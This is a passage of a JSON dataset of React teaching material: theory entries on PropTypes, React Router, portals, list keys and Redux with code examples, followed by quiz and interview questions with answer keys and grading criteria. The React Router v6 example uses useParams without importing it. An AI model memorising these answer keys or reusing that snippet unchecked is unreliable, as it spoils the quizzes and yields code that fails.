              "code": "import React from 'react';\nimport PropTypes from 'prop-types';\n\nfunction UserProfile({ user, hobbies }) {\n  return (\n    <div>\n      <h2>User Profile</h2>\n      <p>Name: {user.firstName} {user.lastName}</p>\n      <p>Age: {user.age}</p>\n      <p>Email: {user.contact.email}</p>\n      <p>Phone: {user.contact.phone}</p>\n      <h3>Hobbies:</h3>\n      <ul>\n        {hobbies.map((hobby, index) => <li key={index}>{hobby}</li>)}\n      </ul>\n    </div>\n  );\n}\n\nUserProfile.propTypes = {\n  user: PropTypes.shape({\n    firstName: PropTypes.string.isRequired,\n    lastName: PropTypes.string.isRequired,\n    age: PropTypes.number.isRequired,\n    contact: PropTypes.shape({\n      email: PropTypes.string.isRequired,\n      phone: PropTypes.string\n    }).isRequired\n  }).isRequired,\n  hobbies: PropTypes.arrayOf(PropTypes.string).isRequired\n};\n\n// Example usage:\n// const userData = {\n//   firstName: 'Jane',\n//   lastName: 'Doe',\n//   age: 28,\n//   contact: { email: 'jane@example.com', phone: '123-456-7890' }\n// };\n// const userHobbies = ['reading', 'hiking', 'cooking'];\n// <UserProfile user={userData} hobbies={userHobbies} />\n",
              "explanation": "This example demonstrates more complex `PropTypes` usage, specifically `PropTypes.shape` for defining the structure of an object prop (`user`) and `PropTypes.arrayOf` for validating an array of specific types (`hobbies`). This allows for detailed validation of nested data structures, ensuring that complex objects or arrays passed as props conform to expected schemas.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_propTypes_1",
            "question_propTypes_2",
            "question_propTypes_3",
            "question_propTypes_4"
          ],
          "relatedTasks": [
            "task_propTypes_1"
          ],
          "tags": [
            "React",
            "Type Checking",
            "Props",
            "Validation",
            "Documentation",
            "TypeScript",
            "Flow"
          ],
          "technology": "React",
          "prerequisites": [
            "react_props",
            "javascript_objects_arrays"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "react_component_design",
            "react_team_collaboration"
          ]
        },
        {
          "id": "theory_react_routing",
          "title": "Implementing Routing in React Applications with React Router",
          "content": "Most single-page applications (SPAs) built with React require client-side routing to navigate between different views or \"pages\" without full page reloads. The most popular and widely adopted library for this purpose is React Router.\n\nReact Router provides a declarative way to define routes and map them to components. It keeps the UI in sync with the URL, allowing for bookmarkable URLs, browser back/forward button support, and dynamic routing.\n\n## Core Components of React Router DOM\n\n`react-router-dom` is the package for web applications and provides several key components:\n\n*   **`BrowserRouter`:** This is the recommended router for web applications. It uses the HTML5 history API (`pushState`, `replaceState`, and the `popstate` event) to keep your UI in sync with the URL. It should wrap your entire application where routing is needed.\n*   **`Route`:** The `Route` component is responsible for rendering UI when a specific path matches the current URL. It takes a `path` prop to define the URL pattern.\n    *   `exact` prop: When added to a `Route`, it ensures that the component is rendered only when the path *exactly* matches the current URL. Without `exact`, a `Route` will render if the path is a *prefix* of the URL.\n    *   `component` prop: Specifies the component to render when the path matches. (In modern React Router, `element` is preferred over `component`).\n    *   **Dynamic Routes:** Routes can include dynamic segments using a colon (`:`), like `/users/:id`. These segments become accessible as parameters in the matched component's `props.match.params` (or via `useParams` hook).\n*   **`Switch` (Legacy, now `Routes` in v6):** In `react-router-dom` v5 and earlier, `Switch` was used to render *only the first* `Route` that matches the current location. This was crucial for handling 404 (Not Found) pages or ensuring only one route component renders. In v6, `Routes` replaces `Switch` and behaves similarly by rendering the first matching `Route` or `Outlet`.\n*   **`Link` / `NavLink`:** These components are used for navigation. `Link` is a basic link, while `NavLink` adds styling capabilities to active links.\n*   **`useNavigate`, `useParams`, `useLocation` (Hooks):** For functional components, React Router v5+ (and especially v6) provides hooks to access routing functionalities and information, replacing `withRouter` HOC and `props.match`, `props.location`, `props.history`.\n\n## Basic Implementation Flow\n\n1.  Install `react-router-dom` (`npm install react-router-dom`).\n2.  Wrap your application's root component or the section that needs routing with `BrowserRouter`.\n3.  Define individual `Route` components within a `Switch` (or `Routes` in v6) component.\n4.  Use `Link` or `NavLink` components for declarative navigation.",
          "examples": [
            {
              "id": "example_react_routing_basic",
              "title": "Basic React Router v5 Implementation",
              "code": "import React from 'react';\nimport { BrowserRouter, Route, Switch, Link } from 'react-router-dom';\n\n// Dummy Components\nconst Home = () => <h2>Home Page</h2>;\nconst About = () => <h2>About Us</h2>;\nconst User = ({ match }) => <h2>User ID: {match.params.id}</h2>;\nconst NotFound = () => <h2>404 - Page Not Found</h2>;\n\nfunction App() {\n  return (\n    <BrowserRouter>\n      <nav>\n        <Link to=\"/\">Home</Link> |\n        <Link to=\"/about\">About</Link> |\n        <Link to=\"/users/123\">User 123</Link>\n      </nav>\n      <hr />\n      <Switch>\n        <Route exact path=\"/\" component={Home} />\n        <Route path=\"/about\" component={About} />\n        <Route path=\"/users/:id\" component={User} />\n        {/* This route acts as a 404 handler if no other route matches */}\n        <Route component={NotFound} />\n      </Switch>\n    </BrowserRouter>\n  );\n}",
              "explanation": "This example demonstrates a basic setup using `react-router-dom` v5. `BrowserRouter` wraps the entire application. `Switch` ensures only one `Route` matches and renders. `exact` is used for the home route to prevent it from matching `/about` or `/users`. A dynamic route `/users/:id` captures a user ID. The last `Route` without a `path` acts as a fallback for 404 pages. `Link` components are used for navigation.",
              "language": "javascript"
            },
            {
              "id": "example_react_routing_v6_concept",
              "title": "React Router v6 `Routes` and `element` (Conceptual)",
              "code": "import React from 'react';\nimport { BrowserRouter, Routes, Route, Link } from 'react-router-dom';\n\n// Dummy Components\nconst Home = () => <h2>Home Page (v6)</h2>;\nconst About = () => <h2>About Us (v6)</h2>;\nconst User = () => {\n  // In v6, use `useParams` hook for dynamic segments\n  const { id } = useParams();\n  return <h2>User ID: {id} (v6)</h2>;\n};\nconst NotFound = () => <h2>404 - Page Not Found (v6)</h2>;\n\nfunction AppV6() {\n  return (\n    <BrowserRouter>\n      <nav>\n        <Link to=\"/\">Home</Link> |\n        <Link to=\"/about\">About</Link> |\n        <Link to=\"/users/456\">User 456</Link>\n      </nav>\n      <hr />\n      {/* 'Routes' replaces 'Switch' in v6 */}\n      <Routes>\n        {/* 'element' prop replaces 'component' */}\n        <Route path=\"/\" element={<Home />} />\n        <Route path=\"/about\" element={<About />} />\n        <Route path=\"/users/:id\" element={<User />} />\n        {/* No 'exact' prop needed for parent routes by default in v6 */}\n        {/* Wildcard path for 404 */}\n        <Route path=\"*\" element={<NotFound />} />\n      </Routes>\n    </BrowserRouter>\n  );\n}",
              "explanation": "This is a conceptual example for React Router v6. `Routes` replaces `Switch`, and the `element` prop now takes JSX directly instead of a component reference. The `exact` prop is no longer explicitly needed for parent routes because v6's routing matching is more intelligent by default. Dynamic parameters are accessed via the `useParams` hook. A `path=\"*\"` route is used for 404 handling.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_react_routing_1",
            "question_react_routing_2",
            "question_react_routing_3",
            "question_react_routing_4"
          ],
          "relatedTasks": [
            "task_react_routing_1"
          ],
          "tags": [
            "React",
            "Routing",
            "React Router",
            "SPA",
            "Navigation",
            "UX"
          ],
          "technology": "React",
          "prerequisites": [
            "react_components",
            "javascript_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "single_page_applications",
            "react_ecosystem"
          ]
        },
        {
          "id": "theory_react_portals",
          "title": "React Portals: Rendering Children Outside Parent Hierarchy",
          "content": "React Portals provide a first-class way to render children into a DOM node that exists outside the DOM hierarchy of the parent component. Normally, a component's render method returns JSX that React then renders as a child of the current component's DOM node. However, sometimes it's necessary for a child to break out of its parent's DOM structure.\n\n## Why and When to Use Portals\n\nPortals are particularly useful for components that need to visually \"escape\" their parent's styling, `overflow: hidden` properties, or `z-index` stacking contexts. Common use cases include:\n\n*   **Modal Dialogs:** A modal needs to overlay the entire page, often requiring a high `z-index` and not being affected by parent `overflow` styles.\n*   **Tooltips and Popovers:** These often need to appear directly next to a trigger element but overlay other content, which can be tricky if the trigger is inside a constrained container.\n*   **Floating Menus/Context Menus:** Similar to tooltips, these need to appear above other content.\n*   **Widgets that Break Out of Containers:** Any component that needs to render its UI independently of its parent's clipping or positioning.\n\nWithout portals, achieving these effects often requires complex CSS (e.g., `position: fixed` with explicit `top`, `left`, `z-index`) or imperative DOM manipulation, which goes against React's declarative nature.\n\n## How Portals Work\n\nA portal is created using `ReactDOM.createPortal()`. It takes two arguments:\n\n1.  `child`: Any renderable React child (e.g., a React element, string, fragment).\n2.  `container`: A DOM element (a reference to an existing DOM node) where the `child` will be mounted.\n\nDespite being rendered into a different DOM node, the portal's content still behaves like a normal React child. It remains part of the *React component tree*, meaning:\n\n*   **Event Bubbling:** Events from inside the portal will bubble up to ancestor components in the *React component tree*, not necessarily the DOM tree. This is a powerful feature, as it means you can still use React's event system as usual.\n*   **Context API:** Context will still flow down from providers in the parent React tree to consumers within the portal.\n\nThis behavior makes portals a powerful tool for solving specific layout and layering problems while maintaining the benefits of React's component model.",
          "examples": [
            {
              "id": "example_react_portal_modal",
              "title": "Implementing a Modal using React Portal",
              "code": "import React, { useState, useEffect, useRef } from 'react';\nimport ReactDOM from 'react-dom';\n\n// Create a dedicated DOM node for modals outside the root app element in public/index.html\n// <div id=\"modal-root\"></div>\n\nconst Modal = ({ children, isOpen, onClose }) => {\n  const modalRootRef = useRef(null);\n\n  // Ensure the modal root element exists and cache it\n  useEffect(() => {\n    modalRootRef.current = document.getElementById('modal-root') || document.createElement('div');\n    if (!document.getElementById('modal-root')) {\n      modalRootRef.current.id = 'modal-root';\n      document.body.appendChild(modalRootRef.current);\n    }\n  }, []);\n\n  if (!isOpen || !modalRootRef.current) return null;\n\n  return ReactDOM.createPortal(\n    <div style={{\n      position: 'fixed',\n      top: 0,\n      left: 0,\n      right: 0,\n      bottom: 0,\n      backgroundColor: 'rgba(0,0,0,0.5)',\n      display: 'flex',\n      justifyContent: 'center',\n      alignItems: 'center',\n      zIndex: 1000 // High z-index to overlay everything\n    }} onClick={onClose}>\n      <div style={{\n        backgroundColor: 'white',\n        padding: '20px',\n        borderRadius: '8px',\n        minWidth: '300px',\n        boxShadow: '0 4px 8px rgba(0,0,0,0.2)',\n        zIndex: 1001 // Higher z-index for modal content\n      }} onClick={e => e.stopPropagation()}>\n        {children}\n        <button onClick={onClose} style={{ marginTop: '20px' }}>Close Modal</button>\n      </div>\n    </div>,\n    modalRootRef.current // The DOM node where the modal content will be rendered\n  );\n};\n\nfunction AppWithModal() {\n  const [isModalOpen, setIsModalOpen] = useState(false);\n\n  return (\n    <div style={{ padding: '20px', height: '150vh', overflow: 'hidden', border: '1px solid gray' }}>\n      <h1>My Application Content</h1>\n      <p>This is some content that might be hidden by overflow rules.</p>\n      <button onClick={() => setIsModalOpen(true)}>Open Modal</button>\n\n      <Modal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)}>\n        <h2>This is a Portal Modal</h2>\n        <p>This content is rendered outside the main app DOM hierarchy.</p>\n      </Modal>\n\n      <p>More content below the fold...</p>\n    </div>\n  );\n}",
              "explanation": "This example shows a `Modal` component implemented using `ReactDOM.createPortal`. The `Modal` component receives `children`, `isOpen`, and `onClose` props. Inside the `Modal`, `ReactDOM.createPortal` renders its children into a specific DOM node (`modal-root`), which is typically a `div` element placed directly under the `<body>` tag in `public/index.html`. This allows the modal to appear above all other content, unaffected by its parent's styling properties like `overflow: hidden`, while still participating in React's event bubbling and context systems.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_react_portals_1",
            "question_react_portals_2",
            "question_react_portals_3",
            "question_react_portals_4"
          ],
          "relatedTasks": [
            "task_react_portals_1"
          ],
          "tags": [
            "React",
            "DOM",
            "Rendering",
            "Modals",
            "Tooltips",
            "UX",
            "Advanced React"
          ],
          "technology": "React",
          "prerequisites": [
            "react_basics",
            "dom_manipulation"
          ],
          "complexity": 8,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "requiredFor": [
            "react_component_patterns",
            "complex_ui_development"
          ]
        },
        {
          "id": "theory_react_keys",
          "title": "The Importance of Keys in React Lists",
          "content": "When rendering lists of elements in React (e.g., using `map()` on an array), it's crucial to assign a special `key` prop to each list item. Keys are not passed as props to your component; rather, they are an internal mechanism used by React to efficiently identify and track elements within a list.\n\n## Why Keys are Important\n\nReact uses keys to optimize its reconciliation process (also known as the 'diffing' algorithm). When a list is updated (items are added, removed, reordered, or their content changes), React needs a way to determine precisely which specific items have changed. Without stable keys, React might re-render or re-mount components unnecessarily, or even apply incorrect state to components.\n\nSpecifically, keys help React:\n\n*   **Identify Items:** Keys provide a stable identity to each list item. When the list changes, React uses the keys to match up items from the old list with items in the new list.\n*   **Optimize Performance:** By identifying which specific items have been added, removed, or reordered, React can perform the minimal necessary DOM manipulations. This leads to better performance, especially for large or frequently changing lists.\n*   **Maintain Component State:** When an item's position changes in a list, a stable key ensures that React can move the *entire component instance* (including its internal state and DOM elements) rather than unmounting and re-mounting it. This prevents state loss and preserves the component's internal logic.\n*   **Prevent Bugs:** Without keys, or with unstable keys, React might reuse existing DOM elements for different data items, leading to strange UI behavior, incorrect state, or unexpected bugs, especially in forms or interactive lists.\n\n## Rules for Keys\n\n1.  **Unique Among Siblings:** Keys must be unique among the items in the *same list* (i.e., among sibling elements). They do not need to be globally unique across the entire application.\n2.  **Stable Across Renders:** The key for a particular item should remain the same across re-renders. This is the most critical rule. If keys change for the same logical item, React will treat it as a *new* component and destroy the old one, losing its state.\n\n## What to Use as Keys\n\n*   **Stable IDs from Data:** The best practice is to use a unique and stable ID that comes from your data source (e.g., a database ID). This is ideal because it naturally fulfills both uniqueness among siblings and stability across renders.\n*   **Array Index (with Caution):** Using an item's index in the array (`map((item, index) => <li key={index}>...</li>)`) is generally discouraged, *unless* the list is static and will never change (i.e., items are never added, removed, or reordered). If the list can change, using the index as a key will lead to performance issues and potential bugs, as reordering items would cause React to mistakenly update wrong components or reset their state.\n*   **Generated IDs (with Caution):** Generating keys dynamically (e.g., using `Math.random()` or a UUID library) on each render is an anti-pattern. This creates *unstable* keys, effectively telling React that every item is new on every render, negating the performance benefits and causing state loss.",
          "examples": [
            {
              "id": "example_react_keys_good",
              "title": "Correct Key Usage with Stable IDs",
              "code": "import React from 'react';\n\nconst itemsWithIds = [\n  { id: 1, text: 'Item A' },\n  { id: 2, text: 'Item B' },\n  { id: 3, text: 'Item C' }\n];\n\nfunction ListItem({ item }) {\n  return <li>{item.text}</li>;\n}\n\nfunction GoodListExample() {\n  return (\n    <div>\n      <h2>Good List Example (Stable IDs)</h2>\n      <ul>\n        {itemsWithIds.map(item => (\n          <ListItem key={item.id} item={item} /> // Using a stable, unique ID as key\n        ))}\n      </ul>\n    </div>\n  );\n}",
              "explanation": "This is the correct and recommended way to use keys. Each `item` object has a stable, unique `id`. This `id` is used as the `key` prop for the `ListItem` component. If `itemsWithIds` array were to change (e.g., `Item B` is removed, or a new item is inserted), React would efficiently identify exactly which DOM elements need to be updated, removed, or reordered, preserving the state of unchanged components.",
              "language": "javascript"
            },
            {
              "id": "example_react_keys_bad_index",
              "title": "Bad Key Usage with Array Index (When List Changes)",
              "code": "import React, { useState } from 'react';\n\nfunction BadListExample() {\n  const [items, setItems] = useState([\n    'Apple', 'Banana', 'Cherry'\n  ]);\n\n  const removeItem = (indexToRemove) => {\n    setItems(items.filter((_, index) => index !== indexToRemove));\n  };\n\n  const addItem = () => {\n    setItems([...items, `New Fruit ${items.length + 1}`]);\n  };\n\n  return (\n    <div>\n      <h2>Bad List Example (Using Index as Key with Changing List)</h2>\n      <button onClick={addItem}>Add Item</button>\n      <ul>\n        {items.map((item, index) => (\n          <li key={index}> {/* DANGER: Using index as key in a mutable list */}\n            {item}\n            <button onClick={() => removeItem(index)}>Remove</button>\n          </li>\n        ))}\n      </ul>\n      <p>Try adding an item, then removing an item from the middle. You might see unexpected behavior or input focus issues if these were inputs.</p>\n    </div>\n  );\n}",
              "explanation": "This example illustrates why using the array index as a key is problematic for lists that change (additions, removals, reordering). When an item is removed from the middle, the indices of subsequent items shift. React, using these unstable indices as keys, might erroneously re-use an existing DOM element (and its internal state) for a different data item, leading to visual glitches or incorrect behavior, particularly with input fields or stateful child components.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_react_keys_1",
            "question_react_keys_2",
            "question_react_keys_3",
            "question_react_keys_4"
          ],
          "relatedTasks": [
            "task_react_keys_1"
          ],
          "tags": [
            "React",
            "Lists",
            "Performance",
            "Reconciliation",
            "Keys",
            "Optimization",
            "Debugging"
          ],
          "technology": "React",
          "prerequisites": [
            "react_components",
            "javascript_arrays_map"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "react_performance_optimization",
            "react_component_rendering"
          ]
        },
        {
          "id": "theory_redux_problem_solved",
          "title": "The Problem Redux Solves: Predictable State Management",
          "content": "In complex frontend applications, managing application state can become challenging. As applications grow, components need to share data, communicate with each other, and respond to various events (user input, API responses). This often leads to issues like:\n\n*   **Prop Drilling:** Passing data down through many layers of nested components, even if intermediate components don't directly use the data. This makes code harder to read, maintain, and refactor.\n*   **Inconsistent State:** Multiple sources of truth for the same piece of data, leading to synchronization issues and bugs.\n*   **Difficult Debugging:** Understanding how data flows and changes across a large application can be very complex, making it hard to track down the cause of bugs.\n*   **Side Effects and Unpredictability:** State changes can be triggered from many places, making the application's behavior hard to predict and test.\n\nRedux is a predictable state container for JavaScript apps that addresses these problems by centralizing application state and enforcing strict rules for updating it. It is built around three core principles:\n\n1.  **Single Source of Truth:** The entire application's state is stored in a single, plain JavaScript object within a single store. This eliminates inconsistencies and makes it easy to inspect the current state.\n2.  **State is Read-Only:** The only way to change the state is by emitting an action, an object describing what happened. This ensures that views or network callbacks never write directly to the state, making changes explicit and traceable.\n3.  **Changes are Made with Pure Functions (Reducers):** To specify how the state tree is transformed by actions, you write pure reducers. Reducers are functions that take the current state and an action as arguments, and return a *new* state. They must not have side effects.\n\n## How Redux Solves the Problem\n\nBy adhering to these principles, Redux provides:\n\n*   **Centralized State:** A single global store holds all application state, eliminating prop drilling for shared data.\n*   **Predictability:** State changes are explicit (via actions) and handled by pure functions (reducers), making the application's behavior predictable and easier to reason about.\n*   **Debuggability:** The strict data flow and immutability of state make it straightforward to track state changes over time. Tools like Redux DevTools allow time-travel debugging, replaying actions, and inspecting state at any point.\n*   **Maintainability:** A clear pattern for state updates simplifies understanding how the application works and facilitates team collaboration.\n*   **Easier Testing:** Pure reducers and actions are inherently easy to test in isolation.\n\nWhile Redux introduces some boilerplate, its benefits in managing complex, shared state often outweigh the overhead for larger applications. For simpler applications or localized state, React's Context API or `useState`/`useReducer` hooks might be sufficient.",
          "examples": [
            {
              "id": "example_redux_problem_prop_drilling",
              "title": "Problem Example: Prop Drilling",
              "code": "import React from 'react';\n\n// Grandparent component has data that Grandchild needs\nfunction Grandparent() {\n  const userData = { name: 'Alice', role: 'Admin' };\n  return <Parent user={userData} />;\n}\n\n// Parent component passes data through to Grandchild, even though Parent doesn't use it\nfunction Parent({ user }) {\n  return <Child user={user} />;\n}\n\n// Child component passes data through to Grandchild, even though Child doesn't use it\nfunction Child({ user }) {\n  return <Grandchild user={user} />;\n}\n\n// Grandchild component finally uses the data\nfunction Grandchild({ user }) {\n  return (\n    <div>\n      <h3>Grandchild Component</h3>\n      <p>User Name: {user.name}</p>\n      <p>User Role: {user.role}</p>\n    </div>\n  );\n}\n\nfunction AppPropDrilling() {\n  return (\n    <div>\n      <h1>Prop Drilling Example</h1>\n      <Grandparent />\n    </div>\n  );\n}",
              "explanation": "This example demonstrates 'prop drilling'. The `userData` defined in `Grandparent` is needed by `Grandchild`. To get it there, it must be passed through `Parent` and `Child` components, even though neither of them uses the `user` prop directly. In larger applications with many nested components and more props, this can become cumbersome and make refactoring difficult. Redux (or React Context) aims to solve this by providing a global store that `Grandchild` can directly connect to.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_redux_problem_solved_1",
            "question_redux_problem_solved_2",
            "question_redux_problem_solved_3",
            "question_redux_problem_solved_4"
          ],
          "relatedTasks": [
            "task_redux_problem_solved_1"
          ],
          "tags": [
            "Redux",
            "State Management",
            "Prop Drilling",
            "Architecture",
            "Predictability",
            "Debugging"
          ],
          "technology": "Redux",
          "prerequisites": [
            "react_state",
            "react_props"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "requiredFor": [
            "large_scale_applications",
            "complex_state_management"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_class_method_binding_1",
          "topic": "Class Method Binding",
          "level": "medium",
          "type": "open",
          "question": "Why is it necessary to bind methods in React class components when they are used as event handlers?",
          "answer": "Binding is necessary because of how the `this` keyword works in JavaScript. When a class method is passed as an event handler (e.g., `onClick={this.handleClick}`), the context (`this`) in which the method is executed changes. By default, in strict mode (which React uses), `this` inside the event handler function will be `undefined`. Binding ensures that `this` inside the method always refers to the component instance, allowing you to access `this.state`, `this.props`, and `this.setState()` correctly.",
          "analysisPoints": [
            "Understanding of JavaScript `this` context.",
            "Knowledge of strict mode behavior.",
            "Ability to explain the problem (loss of `this` context).",
            "Ability to explain the solution's purpose (maintaining component instance reference)."
          ],
          "keyConcepts": [
            "this keyword",
            "function context",
            "strict mode",
            "event handlers",
            "class components"
          ],
          "evaluationCriteria": [
            "Clarity of explanation regarding `this` context.",
            "Correct identification of the problem caused by lack of binding.",
            "Completeness of the explanation."
          ],
          "example": null,
          "tags": [
            "React",
            "Class Components",
            "JavaScript",
            "this",
            "Binding"
          ],
          "prerequisites": [
            "javascript_this_keyword"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_class_method_binding_2",
          "topic": "Class Method Binding",
          "level": "easy",
          "type": "flashcard",
          "question": "What happens if you don't bind `this` for a class method used as an event handler?",
          "answer": "`this` will be `undefined` inside the method, leading to errors like 'Cannot read property 'setState' of undefined'.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "this keyword",
            "event handlers",
            "undefined context"
          ],
          "evaluationCriteria": [
            "Quick recall of consequence"
          ],
          "example": null,
          "tags": [
            "React",
            "Class Components",
            "this",
            "Binding"
          ],
          "prerequisites": [],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_class_method_binding_3",
          "topic": "Class Method Binding",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following methods for binding a class method `handleClick` is generally considered the *most performant* and *least problematic* for a typical React application?",
          "answer": "Using an arrow function as a class property.",
          "options": [
            "Binding in the constructor (`this.handleClick = this.handleClick.bind(this);`)",
            "Using an arrow function as a class property (`handleClick = () => { ... }`)",
            "Binding inline in the render method (`<button onClick={() => this.handleClick()}>Click</button>`)",
            "Not binding at all, as modern React handles it automatically."
          ],
          "analysisPoints": [
            "Evaluates understanding of performance implications of different binding methods.",
            "Tests knowledge of modern JavaScript/React best practices.",
            "Distinguishes between correct and incorrect assumptions about React's behavior."
          ],
          "keyConcepts": [
            "Binding methods",
            "Class properties",
            "Arrow functions",
            "Performance optimization",
            "Render method behavior"
          ],
          "evaluationCriteria": [
            "Correct identification of the most efficient binding strategy.",
            "Understanding of why other options are less ideal (e.g., re-creation of functions)."
          ],
          "example": "Both 'Binding in the constructor' and 'Using an arrow function as a class property' are performant because they bind the method only once. However, using an arrow function as a class property (`handleClick = () => { ... }`) is often preferred due to its conciseness and automatic lexical `this` binding, which reduces boilerplate. Binding inline in the render method (`onClick={() => this.handleClick()}`) creates a new function on every render, which can lead to performance issues and unnecessary re-renders of child components.",
          "tags": [
            "React",
            "Class Components",
            "Performance",
            "Binding",
            "ES6"
          ],
          "prerequisites": [
            "javascript_arrow_functions",
            "react_class_components"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_class_method_binding_4",
          "topic": "Class Method Binding",
          "level": "hard",
          "type": "code",
          "question": "The following React class component aims to increment a counter, but it has a `this` binding issue. Identify the problem and fix it using two different correct binding approaches. Provide the corrected code for both solutions.",
          "answer": "// Solution 1: Bind in constructor\nclass CounterComponentA extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { count: 0 };\n    this.incrementCount = this.incrementCount.bind(this); // Fix: Binding in constructor\n  }\n\n  incrementCount() {\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  }\n\n  render() {\n    return (\n      <button onClick={this.incrementCount}>\n        Count: {this.state.count}\n      </button>\n    );\n  }\n}\n\n// Solution 2: Use arrow function as class property\nclass CounterComponentB extends React.Component {\n  state = { count: 0 };\n\n  incrementCount = () => { // Fix: Arrow function as class property\n    this.setState(prevState => ({ count: prevState.count + 1 }));\n  }\n\n  render() {\n    return (\n      <button onClick={this.incrementCount}>\n        Count: {this.state.count}\n      </button>\n    );\n  }\n}",
          "options": [],
          "analysisPoints": [
            "Ability to recognize `this` binding errors in class components.",
            "Knowledge of multiple correct binding strategies.",
            "Correct application of `this.setState`."
          ],
          "keyConcepts": [
            "this keyword",
            "class components",
            "binding",
            "constructor",
            "arrow functions",
            "setState"
          ],
          "evaluationCriteria": [
            "Code correctness for both solutions.",
            "Demonstration of understanding of underlying `this` context issues.",
            "Readability and adherence to React conventions."
          ],
          "example": "The original problem stems from `this.incrementCount` losing its `this` context when passed as an `onClick` handler. The two solutions address this by either explicitly binding `incrementCount` to the component instance in the constructor, or by defining `incrementCount` as an arrow function class property, which automatically binds `this` lexically.",
          "tags": [
            "React",
            "Class Components",
            "Code Challenge",
            "this",
            "Binding"
          ],
          "prerequisites": [
            "react_class_components",
            "javascript_this_keyword"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_class_method_binding_5",
          "topic": "Class Method Binding",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary benefit of using an arrow function as a class property for event handlers?",
          "answer": "It automatically binds `this` to the component instance, eliminating the need for explicit binding in the constructor and making the code more concise.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "arrow functions",
            "lexical this",
            "conciseness"
          ],
          "evaluationCriteria": [
            "Quick recall of benefits"
          ],
          "example": null,
          "tags": [
            "React",
            "Class Components",
            "Arrow Functions",
            "Binding"
          ],
          "prerequisites": [],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_api_calls_lifecycle_1",
          "topic": "API Calls in React Lifecycle",
          "level": "medium",
          "type": "open",
          "question": "In which lifecycle method should you make API calls in a React class component, and why? What is the equivalent hook for functional components?",
          "answer": "In React class components, API calls should be made in `componentDidMount()`. The reasons are:\n1.  **Runs Once:** `componentDidMount()` is invoked immediately after the component is mounted (inserted into the DOM) for the first time. This prevents unnecessary repeated calls.\n2.  **Safe `setState`:** The component is already mounted, so it's safe to call `this.setState()` with the fetched data without causing an infinite re-render loop.\n3.  **DOM Available:** If the API call depends on DOM elements (though rare), they are guaranteed to be available.\n\nFor functional components, the equivalent hook is `useEffect()` with an empty dependency array (`[]`). This tells React to run the effect only once after the initial render, mimicking `componentDidMount` behavior.",
          "analysisPoints": [
            "Correctly identifies `componentDidMount` for class components.",
            "Provides valid reasons for `componentDidMount` (once, safe `setState`).",
            "Correctly identifies `useEffect` with empty array for functional components.",
            "Demonstrates understanding of both paradigms."
          ],
          "keyConcepts": [
            "componentDidMount",
            "useEffect hook",
            "API calls",
            "lifecycle methods",
            "side effects"
          ],
          "evaluationCriteria": [
            "Completeness of the answer for both class and functional components.",
            "Accuracy of explanations for 'why'."
          ],
          "example": null,
          "tags": [
            "React",
            "Lifecycle Methods",
            "Hooks",
            "API Calls",
            "componentDidMount",
            "useEffect"
          ],
          "prerequisites": [
            "react_class_components",
            "react_functional_components"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_api_calls_lifecycle_2",
          "topic": "API Calls in React Lifecycle",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following functional component attempting to fetch data. Which line of code correctly ensures the API call runs only once after the initial render, similar to `componentDidMount`?",
          "answer": "`useEffect(() => { /* fetch logic */ }, []);`",
          "options": [
            "`useEffect(() => { /* fetch logic */ });`",
            "`useEffect(() => { /* fetch logic */ }, [data]);`",
            "`useEffect(() => { /* fetch logic */ }, []);`",
            "API calls should not be made directly in functional components."
          ],
          "analysisPoints": [
            "Tests knowledge of `useEffect` dependencies.",
            "Distinguishes between `useEffect` behaviors with different dependency arrays.",
            "Confirms understanding of how to mimic `componentDidMount` with hooks."
          ],
          "keyConcepts": [
            "useEffect",
            "dependency array",
            "componentDidMount",
            "initial render"
          ],
          "evaluationCriteria": [
            "Correct identification of the `useEffect` signature for one-time execution."
          ],
          "example": "The `useEffect` hook with an empty dependency array (`[]`) tells React to run the effect only once after the initial render and clean it up when the component unmounts. This is the direct equivalent of `componentDidMount` for fetching data. Without a dependency array, the effect runs after every render. With `[data]`, it runs whenever `data` changes.",
          "tags": [
            "React",
            "Hooks",
            "useEffect",
            "API Calls",
            "Functional Components"
          ],
          "prerequisites": [
            "react_hooks"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_api_calls_lifecycle_3",
          "topic": "API Calls in React Lifecycle",
          "level": "hard",
          "type": "open",
          "question": "Explain why making an API call directly in the `constructor` or `render` method of a React component is problematic. What are the potential issues?",
